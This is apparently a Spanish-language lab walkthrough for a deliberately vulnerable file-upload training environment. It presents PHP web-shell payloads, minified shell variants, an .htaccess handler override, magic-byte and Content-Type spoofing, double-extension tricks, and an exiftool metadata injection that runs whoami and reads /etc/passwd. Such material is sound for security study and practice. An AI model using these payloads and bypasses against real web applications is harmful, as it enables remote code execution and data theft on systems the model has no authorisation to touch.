> Aprovecharse de una mala sanitizacion a la hora de subir un archivo.

## Laboratorio
- `git clone https://github.com/moeinfatehi/file_upload_vulnerability_scenarios.git`
- `cd file_upload_vulnerability_scenarios`
- `docker compose up -d`
- Listo tenemos en el `localhost:9001` los niveles

## Ataques

- Archivo base
```
<?php
	system($_GET['cmd']);
?>
```
### Nivel 1
- Sin sanitizacion, se sube cualquier archivo

### Nivel 2
- La validacion al hacerse del lado del cliente se puede simplemente eliminar que al presionar Enviar se ejecute determinada funcion y listo, lo envia.

### Nivel 3 y 4
- A partir de aqui la validacion se hace en el servidor
- Pero php, como otros lenguajes, tiene varias extensiones
- Entre las que tiene: _.php_ , _.php2_ , _.php3_ , _.php4_ , _.php5_ , _.php6_ , _.php7_ , _.phps_, _.phps_ , _.pht_ , _.phtm, .phtml_ , _.pgif_ , _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- Vamos probando cual acepta y luego cual compila, puede aceptar pero no ejecutar y eso tampoco nos sirve.

### Nivel 5
- hay una extension .htaccess que me permite ejecutar un archivo con cualquier extension como codigo php, osea interpreta el codigo dentro como php, aunque la extension del archivo sea .test por ejemplo.
- Subimos un archivo `.htaccess` y en el contenido
```
AddType application/x-httpd-php .test
```
- Cualquier archivo .test interpretamelo con php
- Entonces si luego subimos un archivo hola.test con esto lo interpreta
```
<?php
	system($_GET['cmd']);
?>
```

### Nivel 6 y 7
- Tenemos un limite de subida pero en la peticion se puede modificar el tamanio del archivo
- Por ejemplo tenemos un limite de 30, lo cambiamos a 80 y el archivo se sube sin problemas

### Nivel 8
- Tambien hay limite para el archivo pero no podemos manipular el tamanio
- Debemos buscar formas de reducir el contenido
- Formas:
```
<?php system($_GET['cmd']);?>
```
- Otra donde quedaria en la web `?a=id`
```
<?php system($_GET['a']);?>
```
- Otra donde quedaria `?0=id`
```
<?php system($_GET[0]);?>
```
- Otra donde php desaparece
```
<?= system($_GET[0]);?>
```
- Otra mas loca
```
<?=`($_GET[0]`;?>
```

### Nivel 9
- Aca tenemos una validacion por servidor fuerte del tipo de archivo
- Pero probar extensiones diferentes no sirve porque esta mirando los primeros bytes del archivo y viendo si realmente es .gif por ejemplo.
- Con file, podemos ver que tipo de archivo es 
```
file cmd.php
```
- Por detras se utiliza un xxd para ver en binario el contenido y el primer byte se corresponde con un tipo de archivo. Ese primer byte se suele llamar "**magic numbers**" y si se busca en Wikipedia se encuentran todas las correspondencias.
```
xxd cmd.php
```
- Este comando file entonces se basa en lo primero que encuentra en el archivo que seria <?php en nuestro caso, pero si colocamos una linea comun a .gif como GIF8; lo interpretara diferente

- Luego tambien deberiamos cambiar la forma en que interpreta el servidor
```
Content-Type: application/x-php
```
- Cambiamos a 
```
Content-Type: image/gif
```

### Nivel 10 y 11
- Aqui nos deja subir el archivo cmd.php sin problemas pero le cambia el nombre a uno un toque complicado
- Pero chequeando en codigo fuente hay una cadena de 32 caracteres que parece ser md5, entonces con codificar el nombre del archivo _cmd_ en md5 y agregarle la extension .php ya esta
- A veces se puede codificar el nombre del archivo **cmd**, el archivocon su extension **cmd.php** o se aplica al contenido entero **<php? blabalbal ?>**

### Nivel 12
- Esta cadena tiene la particularidad de tener 40 caracteres, lo que corresponde a una codificacion con sha1sum
- Aplica lo mismo que la anterior, es ir probando con que cadena es

### Nivel 13
- Ataque de doble extension
```
cmd.jpg.php
```

### Nivel 14
- Me sube el archivo cmd.php sin problemas pero para ejecutarlo me dice que lo descargue pero yo puedo desde la cli
```
curl -s http://localhost:9001/uploads56/testing/cmd.php -G --data-urlencode "cmd=id"
```
- Lo de testing es porque me deja elegir el nombre del directorio nomas

### Nivel 15
- Aqui mezcla varios tipos de ataques
- Primero debemos subir un archivo .htaccess para permitir archivos con otra extension
- Luego ya subimos el que nos interesa

## Jugando con metadatos
- Cualquier recurso tiene metadatos, que son daatos que describen a ese recurso
- Podemos inyectar metadatos a una imagen y colocar contenido malicioso con [[exiftool]]
```
exiftool -Comment='<?php system('whoami && ls -l && cat /etc/passwd');?> cat.git
```
- Estamos agregando un metadato llamado Comment que contiene ese codigo en una imagen llamada cat.git
- Entonces al subir esta imagen y verla en alguna parte veremos tambien el resultado del comando ejecutado



